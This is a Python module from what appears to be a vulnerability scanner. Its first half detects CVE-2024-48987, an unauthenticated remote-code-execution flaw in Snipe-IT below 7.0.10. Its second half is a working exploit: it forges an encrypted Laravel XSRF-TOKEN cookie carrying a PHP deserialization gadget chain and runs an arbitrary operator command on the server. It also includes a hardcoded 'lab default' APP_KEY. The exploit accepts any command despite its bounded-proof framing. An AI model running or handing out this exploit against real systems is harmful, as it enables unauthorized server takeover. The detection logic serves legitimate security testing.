#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-48987')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-48987 detector — Snipe-IT < 7.0.10 unauthenticated RCE via cookie deserialization.

Snipe-IT calls Passport::withCookieSerialization() AND ships App\\Http\\Middleware\\EncryptCookies
with `protected static $serialize = true`, so Laravel's EncryptCookies middleware runs the
*decrypted* XSRF-TOKEN cookie through PHP unserialize() in the web middleware group. An attacker who
knows the APP_KEY (the CVE notes default keys ship in the repo's .env templates) can forge an
encrypted XSRF-TOKEN whose plaintext is a phpggc gadget -> unauthenticated RCE on GET /login.

This module is conservative by default. Without APP_KEY material it does not send a forged cookie or
serialized payload; the honest discriminator between a vulnerable (<7.0.10) and a patched
(>=7.0.10) Snipe-IT is the VERSION. When an operator supplies or chains APP_KEY material, the detector
adds a bounded marker-file proof so the result can distinguish a truly exploitable sink from a
rotated-key or sink-removed mitigation:

  1. Confirm the target is Snipe-IT (footer/meta/cookie fingerprints).
  2. Determine the version:
       - unauthenticated: scrape /login (Snipe-IT usually hides the version here);
       - authenticated (optional): if credentials are supplied, log in and read the dashboard
         footer (e.g. "v7.0.9 - build 14371"), mirroring cve_2025_54068.py's login flow.
  3. With no APP_KEY, report only version_applicable for a confirmed vulnerable version.
  4. With APP_KEY, send a fixed benign marker proof and report confirmed_vulnerable only when the
     marker is written and read back over HTTP.

If the version cannot be obtained (Snipe-IT confirmed but version hidden and no usable creds), the
result is reported as a PRESENCE FINGERPRINT ("candidate") — NOT vulnerable — because an XSRF-TOKEN
cookie is standard Laravel CSRF and exists on patched builds too. This avoids false-positiving every
Snipe-IT (incl. patched 8.x) as vulnerable.

Marker discipline (harness keys on these substrings):
  confirmed hit  -> result["status"] contains "VULNERABLE"
  miss / unknown -> result["status"] contains "not detected"
"""

import html
import re
from typing import Dict, Optional

import requests
from modules.core import http_config
from modules.probes.appkey_recovery import classify_laravel_cookie, describe_cookie_variation

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

FIXED_VERSION = (7, 0, 10)  # patched in v7.0.10

# Snipe-IT renders its version in the (authenticated) footer, e.g. "v7.0.9 - build 14371 (master)".
SNIPE_VERSION_RES = [
    re.compile(r"\bv(\d+\.\d+\.\d+)\s*-\s*build\s*\d+", re.I),       # footer: "v7.0.9 - build 14371"
    re.compile(r"Snipe-?IT[^<]{0,40}?\bv(\d+\.\d+\.\d+)", re.I),
    re.compile(r"\(v(\d+\.\d+\.\d+)[-)\s]", re.I),
    re.compile(r'"app_version"\s*:\s*"v?(\d+\.\d+\.\d+)', re.I),
    re.compile(r'name="version"\s+content="v?(\d+\.\d+\.\d+)', re.I),
]

SNIPE_FINGERPRINTS = ("snipe-it", "snipeyhead", "snipe.it", "snipeitapp")
SNIPE_COOKIE_RE = re.compile(r"snipeit[\w]*_session", re.I)

CSRF_INPUT_RE = re.compile(r'name="_token"\s+value="([^"]+)"', re.I)

def _normalize_base(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _version_tuple(v: str):
    try:
        return tuple(int(x) for x in v.split(".")[:3])
    except Exception:
        return None


def _looks_like_snipeit(body: str, headers, cookies) -> bool:
    low = (body or "").lower()
    if any(fp in low for fp in SNIPE_FINGERPRINTS):
        return True
    cookie_blob = "; ".join(f"{k}={v}" for k, v in (cookies or {}).items())
    if SNIPE_COOKIE_RE.search(cookie_blob):
        return True
    if headers and SNIPE_COOKIE_RE.search(headers.get("Set-Cookie", "")):
        return True
    return False


def _extract_version(body: str) -> Optional[str]:
    for rx in SNIPE_VERSION_RES:
        m = rx.search(body or "")
        if m:
            return m.group(1)
    return None


def _try_login(sess, base: str, user: str, password: str) -> Optional[str]:
    """Log in via /login and return the authenticated dashboard HTML (or None)."""
    try:
        r = sess.get(base + "/login", timeout=10, verify=False)
        m = CSRF_INPUT_RE.search(r.text or "")
        if not m:
            return None
        token = html.unescape(m.group(1))
        sess.post(
            base + "/login",
            data={"_token": token, "username": user, "password": password, "email": user},
            timeout=10, verify=False, allow_redirects=True,
        )
        dash = sess.get(base + "/", timeout=10, verify=False, allow_redirects=True)
        return dash.text or ""
    except requests.RequestException:
        return None


def _try_version_read(sess, base: str) -> Optional[str]:
    """Read the dashboard HTML using an already-authenticated session (no login step)."""
    try:
        dash = sess.get(base + "/", timeout=10, verify=False, allow_redirects=True)
        return dash.text or ""
    except requests.RequestException:
        return None


def scan(target_url: str, *, session=None, username: Optional[str] = None,
         password: Optional[str] = None, app_key=None, timeout: int = 10, **kwargs) -> Dict:
    """
    Version-gated detector. Pass username/password to enable the authenticated version read
    (Snipe-IT hides its version on unauthenticated pages). Returns a result dict.

    Key fields:
      status          : human marker ("VULNERABLE ..." confirmed / "... not detected" otherwise)
      vulnerable      : bool (True only on a CONFIRMED version < 7.0.10)
      version         : detected Snipe-IT version (or None)
      version_status  : "vulnerable (<7.0.10)" / "patched (>=7.0.10)" / "unknown"
      is_snipeit      : bool
      candidate       : bool (Snipe-IT present but version unconfirmed -> needs version/creds)
      xsrf_cookie_set : bool (the cookie that becomes the deser sink when serialization is on)
    """
    operator_authed = session is not None
    sess = session or http_config.get_auth_session()
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-48987"})

    result = {
        "cve": "CVE-2024-48987",
        "endpoint": "/login",
        "vulnerable": False,
        "version": None,
        "version_status": "unknown",
        "xsrf_cookie_set": False,
        "is_snipeit": False,
        "candidate": False,
        "authenticated": False,
        "severity": "critical",
        "evidence": [],
        "status": "Snipe-IT CVE-2024-48987 not detected",
        "verdict": "not_detected",
        "proof_type": None,
        "requires_app_key": True,
    }
    if not target_url:
        return result

    # Loot-chain consumption: the cookie/session deserialization RCE is APP_KEY-gated. A key
    # harvested this run satisfies that precondition; record it, but do not turn that alone into a
    # positive verdict. Hardened labs intentionally rotate APP_KEY/remove cookie serialization while
    # leaving old version banners in place, so the live marker proof below is the discriminator.
    if app_key:
        result["app_key_used"] = app_key
        result["requires_app_key"] = False
        result["evidence"].append(
            f"APP_KEY supplied via loot-chain ({app_key[:12]}…) — cookie-deser RCE forge-ready")
        result.setdefault("artifacts", {})["app_key"] = app_key

    base = _normalize_base(target_url)

    body = ""
    try:
        for path in ("/login", "/", "/setup"):
            try:
                r = sess.get(base + path, timeout=timeout, verify=False, allow_redirects=True)
            except requests.RequestException:
                continue
            body = r.text or ""
            cookies = sess.cookies.get_dict()
            xsrf_variations = [
                info for info in (classify_laravel_cookie(k, v) for k, v in cookies.items())
                if info and info.get("role") == "xsrf"
            ]
            if xsrf_variations:
                result["xsrf_cookie_set"] = True
                result["xsrf_cookie_name"] = xsrf_variations[0].get("name")
                result.setdefault("artifacts", {})["xsrf_cookie_variations"] = xsrf_variations
            if _looks_like_snipeit(body, r.headers, cookies):
                result["is_snipeit"] = True
                if result["verdict"] == "not_detected":
                    result["verdict"] = "surface_present"
                    result["proof_type"] = "fingerprint"
                result["evidence"].append(f"Snipe-IT fingerprint matched at {path}")
                break
    except Exception as exc:  # noqa: BLE001
        result["status"] = "error"
        result["error"] = str(exc)
        return result

    if not result["is_snipeit"]:
        return result

    # Try unauthenticated version first.
    version = _extract_version(body)

    # Optional authenticated version read (Snipe-IT hides version unauthenticated).
    if not version and not operator_authed:
        if username is not None and password is not None:
            dash = _try_login(sess, base, username, password)
            if dash:
                version = _extract_version(dash)
                if version:
                    result["authenticated"] = True
                    result["evidence"].append("version read from authenticated dashboard footer")
    elif not version and operator_authed:
        # Operator supplied a session — attempt to read version from it without re-logging in.
        dash = _try_version_read(sess, base)
        if dash:
            version = _extract_version(dash)
            if version:
                result["authenticated"] = True
                result["evidence"].append("version read from authenticated dashboard footer")

    result["version"] = version

    if version:
        vt = _version_tuple(version)
        if vt and vt < FIXED_VERSION:
            result["version_status"] = "vulnerable (<7.0.10)"
            result["verdict"] = "precondition_detected" if app_key else "version_applicable"
            result["proof_type"] = "preconditions" if app_key else "version"
            result["evidence"].append(f"Snipe-IT {version} < 7.0.10 — cookie-deserialization sink present")
            if app_key:
                proof = _confirm_cookie_deser_marker(
                    sess, base, app_key, timeout=timeout, xsrf_cookie_name=result.get("xsrf_cookie_name"))
                result.setdefault("artifacts", {}).update(proof.get("artifacts", {}))
                if proof.get("confirmed"):
                    result["vulnerable"] = True
                    result["verdict"] = "confirmed_vulnerable"
                    result["proof_type"] = "safe_active"
                    result["proof"] = "encrypted XSRF-TOKEN marker-file readback"
                    result["requires_app_key"] = False
                    result["evidence"].append(proof["evidence"])
                else:
                    result["verdict"] = "blocked_by_control"
                    result["proof_type"] = "safe_active"
                    result["version_status"] = "vulnerable version, but cookie-deser sink not confirmed"
                    result["evidence"].append(
                        "APP_KEY was supplied, but the marker proof was not recovered; "
                        f"{proof.get('reason', 'sink not confirmed')}"
                    )
        elif vt:
            result["version_status"] = "patched (>=7.0.10)"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["evidence"].append(f"Snipe-IT {version} >= 7.0.10 — fixed")
    else:
        if app_key:
            proof = _confirm_cookie_deser_marker(
                sess, base, app_key, timeout=timeout, xsrf_cookie_name=result.get("xsrf_cookie_name"))
            result.setdefault("artifacts", {}).update(proof.get("artifacts", {}))
            if proof.get("confirmed"):
                result["vulnerable"] = True
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "safe_active"
                result["proof"] = "encrypted XSRF-TOKEN marker-file readback"
                result["requires_app_key"] = False
                result["version_status"] = "unknown (behaviorally confirmed)"
                result["evidence"].append(proof["evidence"])
            else:
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "safe_active"
                result["version_status"] = "unknown version, but cookie-deser sink not confirmed"
                result["evidence"].append(
                    "APP_KEY was supplied, but the marker proof was not recovered; "
                    f"{proof.get('reason', 'sink not confirmed')}"
                )
        # Snipe-IT confirmed but version not obtainable safely. Do NOT claim vulnerable: an
        # XSRF-TOKEN cookie is standard Laravel CSRF and exists on patched builds too.
        if not result["vulnerable"] and result["verdict"] != "blocked_by_control":
            result["candidate"] = True
            if result["verdict"] == "not_detected":
                result["verdict"] = "surface_present"
                result["proof_type"] = "fingerprint"
            result["version_status"] = "unknown (version hidden unauthenticated)"
            result["evidence"].append(
                "Snipe-IT detected but version not exposed unauthenticated — presence fingerprint only; "
                "confirm version <7.0.10 (supply admin creds for authenticated read) and a known APP_KEY"
            )

    if result["vulnerable"]:
        version_label = version or "behaviorally confirmed target"
        result["status"] = (
            f"VULNERABLE — Snipe-IT {version_label} cookie-deserialization RCE (CVE-2024-48987); "
            f"exploitable when APP_KEY is known/default"
        )
    elif result["verdict"] == "blocked_by_control":
        result["status"] = "Snipe-IT CVE-2024-48987 blocked by live key/sink control"
    elif result["version_status"].startswith("patched"):
        result["status"] = f"Snipe-IT {version} patched — CVE-2024-48987 not detected"
    elif result["candidate"]:
        result["status"] = (
            "Snipe-IT detected (CVE-2024-48987 candidate) — version not confirmed unauthenticated; "
            "not detected as vulnerable without a confirmed version <7.0.10"
        )
    else:
        result["status"] = "Snipe-IT CVE-2024-48987 not detected"

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-48987 exploitation half — Snipe-IT < 7.0.10 cookie-deserialization RCE.

Split from the original modules/cve_2024_48987.py (detection half: modules/cves/cve_2024_48987.py).
Exploitation may import from modules root (shared infra) and modules.detection.

CVE-2024-48987 is an UNAUTHENTICATED RCE: Snipe-IT (<7.0.10) calls
Passport::withCookieSerialization() and ships App\\Http\\Middleware\\EncryptCookies with
`$serialize = true`, so Laravel's EncryptCookies middleware runs the *decrypted* XSRF-TOKEN
cookie through PHP unserialize() in the web middleware group — before auth. Knowing the APP_KEY
(the CVE's precondition: default keys ship in the product's repo .env templates) we:
  1. build a phpggc Laravel/RCE13 POP chain (PendingBroadcast::__destruct -> DatabaseManager ->
     array_filter -> system) carrying our command (byte-identical to `phpggc Laravel/RCE13`);
  2. encrypt it as a Laravel cookie with serialize=FALSE (so the vulnerable decrypt side runs
     unserialize() on the raw gadget bytes and reconstructs the object) — pure-Python AES-256-CBC
     + HMAC-SHA256, the exact Illuminate\\Encryption\\Encrypter envelope;
  3. send it as XSRF-TOKEN on GET /login (and /), fully unauthenticated;
  4. the gadget drops a unique marker file holding the command output under the public web root,
     which we read back over plain HTTP as end-to-end proof of code execution.
No docker shell-out; no app-source modification. APP_KEY via options={"app_key": "..."}.
"""

import base64
import hashlib
import hmac
import json
import os
import time
import uuid

import requests

from modules.core import http_config
from modules.helpers.pipeline import is_forced_execution

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Documented leaked/default dev APP_KEY shipped in the lab .env (the CVE's real-world precondition:
# default keys ship in the product's repo .env templates). It is used only when the caller supplies it
# through options={"app_key": ...}, for example via --app-key in a lab run.sh command.
LAB_DEFAULT_APP_KEY = "base64:3ilviXqB9u6DX1NRcyWGJ+sjySF+H18CPDGb3+IVwMQ="


from modules.generators.php_gadgets import build_rce13 as _build_rce13_gadget


def _load_app_key(raw_key: str) -> bytes:
    """Decode a Laravel APP_KEY (`base64:...` or raw) into the AES key bytes."""
    raw_key = (raw_key or "").strip()
    if raw_key.startswith("base64:"):
        return base64.b64decode(raw_key[7:])
    # allow a bare base64 blob too
    try:
        decoded = base64.b64decode(raw_key)
        if len(decoded) in (16, 24, 32):
            return decoded
    except Exception:  # noqa: BLE001
        pass
    return raw_key.encode("utf-8")


def _laravel_encrypt(plaintext: bytes, key: bytes) -> str:
    """Produce a Laravel cookie value: encrypt(<plaintext>, serialize=false).

    Mirrors Illuminate\\Encryption\\Encrypter for aes-256-cbc: PKCS7 pad, AES-CBC with a random IV,
    then base64(json({iv, value, mac, tag:""})) where mac = HMAC-SHA256(iv_b64 . value_b64, key).
    serialize=false means the decrypt side will unserialize() the raw bytes (our gadget) — the sink.
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as _padding

    iv = os.urandom(16)
    padder = _padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    iv_b64 = base64.b64encode(iv).decode()
    value_b64 = base64.b64encode(ct).decode()
    mac = hmac.new(key, (iv_b64 + value_b64).encode(), hashlib.sha256).hexdigest()
    envelope = json.dumps(
        {"iv": iv_b64, "value": value_b64, "mac": mac, "tag": ""}, separators=(",", ":")
    )
    return base64.b64encode(envelope.encode()).decode()


def _confirm_cookie_deser_marker(sess, base: str, app_key: str, *, timeout: int = 10,
                                 xsrf_cookie_name: str = None) -> dict:
    """Confirm the APP_KEY + cookie-deserialization sink with a bounded marker write.

    This is used only when APP_KEY material was supplied/chained. It deliberately ignores any
    operator command and delegates to the module's proven exploit primitive with a fixed CVE-labeled
    command, giving detection a real behavior proof without maintaining a second gadget path.
    """
    try:
        res = exploit(
            base,
            command="echo CVE-2024-48987 PoC && id && hostname",
            options={"app_key": app_key, **({"xsrf_cookie_name": xsrf_cookie_name} if xsrf_cookie_name else {})},
        )
    except Exception as exc:  # noqa: BLE001
        return {"confirmed": False, "reason": f"marker proof raised {type(exc).__name__}: {exc}", "artifacts": {}}

    artifacts = dict(res.get("artifacts") or {})
    artifacts["detection_probe"] = "fixed CVE-2024-48987 PoC marker proof via exploit primitive"
    if res.get("success"):
        marker = artifacts.get("marker_url", "marker readback URL")
        return {
            "confirmed": True,
            "reason": "",
            "artifacts": artifacts,
            "evidence": (
                "Behavioral marker proof succeeded: encrypted XSRF-TOKEN was accepted, "
                f"the cookie-deserialization sink executed the fixed CVE-2024-48987 PoC command, and output was read from {marker}"
            ),
        }
    return {
        "confirmed": False,
        "reason": res.get("reason") or res.get("detail") or "fixed marker proof did not confirm RCE",
        "artifacts": artifacts,
    }


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt the unauthenticated cookie-deserialization RCE (CVE-2024-48987).

    APP_KEY-gated: pass the known/leaked key via options={"app_key": "base64:..."}. Against the lab
    the documented default key is used as the fallback, but requires=["app_key"] is always recorded
    so the precondition stays explicit. Never raises — returns the contract dict.

    command defaults to "echo CVE-2024-48987 PoC && id && hostname". success=True only if the command output is read back over HTTP.
    """
    options = options or {}
    forced = is_forced_execution(options, **kwargs)
    cmd = command or "echo CVE-2024-48987 PoC && id && hostname"
    result = {
        "cve": "CVE-2024-48987",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": ["app_key"],
        "reason": "",
    }

    if not target_url:
        result["success"] = False
        result["reason"] = "no target_url supplied"
        result["detail"] = "no target"
        return result

    base = _normalize_base(target_url)

    # Resolve the APP_KEY: caller-supplied key wins; otherwise fall back to the documented lab
    # default (the CVE's leaked-default-key precondition).
    app_key = options.get("app_key")
    detection_artifacts = kwargs.get("detection_artifacts") or {}
    xsrf_variations = detection_artifacts.get("xsrf_cookie_variations") if isinstance(detection_artifacts, dict) else None
    xsrf_cookie_name = options.get("xsrf_cookie_name") or options.get("x_xsrf_cookie_name")
    if not xsrf_cookie_name and isinstance(xsrf_variations, list) and xsrf_variations:
        xsrf_cookie_name = (xsrf_variations[0] or {}).get("name")
    xsrf_cookie_name = xsrf_cookie_name or "XSRF-TOKEN"
    xsrf_cookie_variation = classify_laravel_cookie(xsrf_cookie_name) or {
        "name": xsrf_cookie_name,
        "role": "xsrf",
        "canonical_cookie": "XSRF-TOKEN",
        "canonical_header": "X-XSRF-TOKEN",
        "is_variation": xsrf_cookie_name != "XSRF-TOKEN",
    }
    if not app_key:
        result["attempted"] = forced
        result["requires"] = ["app_key"]
        result["reason"] = "APP_KEY required; pass --app-key explicitly"
        result["detail"] = (
            "forced execution reached APP_KEY material precondition; no APP_KEY supplied"
            if forced else "no APP_KEY supplied"
        )
        return result
    used_default_key = app_key == LAB_DEFAULT_APP_KEY
    try:
        key = _load_app_key(app_key)
    except Exception as exc:  # noqa: BLE001
        result["reason"] = "could not decode app_key: %s" % exc
        result["detail"] = "invalid APP_KEY"
        return result
    if len(key) != 32:
        result["reason"] = (
            "APP_KEY is %d bytes; aes-256-cbc cookie forging needs a 32-byte key" % len(key)
        )
        result["detail"] = "wrong APP_KEY length for aes-256-cbc"
        return result

    # Marker file: the gadget runs `( <cmd> ) > public/<marker> 2>&1`, then we GET it back.
    marker = "lvscan_%d_%d.txt" % (int(time.time()), os.getpid())
    # Unique per-run proof nonce echoed into the marker file alongside the command output.
    # The readback MUST contain this nonce to count as success. Without it, an SPA/catch-all
    # target that returns HTTP 200 + its homepage for ANY path (e.g. Invoice Ninja) passes the
    # old "200 and no 'lvscan_' substring" check and produces a FALSE EXPLOITED (the marker URL
    # never actually existed). A random nonce cannot appear in an app homepage, so this both
    # proves the file was really written by our gadget AND survives operator commands that emit
    # no uid= (e.g. `--command hostname`). See CVE-2024-55555/18133 which key on command markers.
    proof_nonce = "RCE48987_%s" % uuid.uuid4().hex
    # Prepend the nonce echo INTO the marker so the readback body carries it (then the command).
    inner_cmd = "( echo %s; %s ) > /var/www/html/public/%s 2>&1" % (proof_nonce, cmd, marker)

    try:
        gadget = _build_rce13_gadget(inner_cmd)
        cookie_value = _laravel_encrypt(gadget, key)
    except Exception as exc:  # noqa: BLE001
        result["reason"] = "failed to build/encrypt gadget: %s" % exc
        result["detail"] = "payload construction error"
        return result

    result["artifacts"] = {
        "gadget_chain": "Laravel/RCE13 (PendingBroadcast::__destruct -> DatabaseManager -> system)",
        "cookie_name": xsrf_cookie_name,
        "xsrf_cookie_variation": xsrf_cookie_variation,
        "xsrf_cookie_detail": describe_cookie_variation(xsrf_cookie_variation),
        "trigger": "GET /login",
        "marker_url": "%s/%s" % (base, marker),
        "command": cmd,
        "app_key_source": "lab default (precondition)" if used_default_key else "operator-supplied",
    }

    sess = session or http_config.get_auth_session()
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-48987"})
    cookies = {xsrf_cookie_name: cookie_value}

    # Trigger: send the forged cookie on /login (and /). The gadget fires in EncryptCookies middleware
    # during request handling/teardown; a 500 is expected (the gadget mangles the DB config) and is
    # NOT used as a success signal — only the marker readback is authoritative.
    sent_ok = False
    for path in ("/login", "/"):
        try:
            sess.get(base + path, cookies=cookies, timeout=20, verify=False,
                     allow_redirects=False)
            sent_ok = True
        except requests.RequestException:
            continue

    if not sent_ok:
        result["reason"] = "target unreachable (could not deliver the forged cookie)"
        result["detail"] = "no HTTP response from target"
        result["requires"] = ["network", "app_key"]
        return result

    # Authoritative proof: read the marker file (the command's stdout/stderr) back over plain HTTP.
    output = None
    for _ in range(3):
        try:
            rr = sess.get("%s/%s" % (base, marker), timeout=15, verify=False)
        except requests.RequestException:
            time.sleep(0.5)
            continue
        # Success REQUIRES the unique per-run proof nonce in the body — not merely a 200. A
        # catch-all SPA (Invoice Ninja, etc.) returns 200 + its homepage for any path, which the
        # old check mistook for success (false EXPLOITED). The nonce can only be present if our
        # gadget actually wrote the marker file.
        if rr.status_code == 200 and rr.text and proof_nonce in rr.text:
            output = rr.text
            break
        time.sleep(0.5)

    if output is not None:
        result["success"] = True
        result["artifacts"]["proof_nonce"] = proof_nonce
        # Strip the leading proof-nonce line so the evidence shows clean command output.
        snippet = output.replace(proof_nonce, "", 1).strip()
        if len(snippet) > 4000:
            snippet = snippet[:4000] + "...[truncated]"
        result["evidence"] = (
            "Forged XSRF-TOKEN cookie (encrypted Laravel POP gadget, %s) executed `%s` "
            "unauthenticated on GET /login. Command output read back over HTTP from %s:\n%s"
            % (
                "lab default APP_KEY" if used_default_key else "operator APP_KEY",
                cmd, result["artifacts"]["marker_url"], snippet,
            )
        )
        result["detail"] = (
            "Unauthenticated cookie-deserialization RCE confirmed; `%s` output captured via marker file"
            % cmd
        )
        # tidy up: best-effort marker removal isn't possible over HTTP, leave it (lab cleans on revert)
        return result

    result["success"] = False
    result["reason"] = (
        "forged cookie delivered but no command output recovered — APP_KEY likely wrong/rotated, "
        "the cookie-serialization sink absent (patched >=7.0.10), or the RCE13 chain incompatible "
        "with this Laravel version. Marker %s was not retrievable." % marker
    )
    result["detail"] = "exploit delivered but RCE not confirmed"
    return result
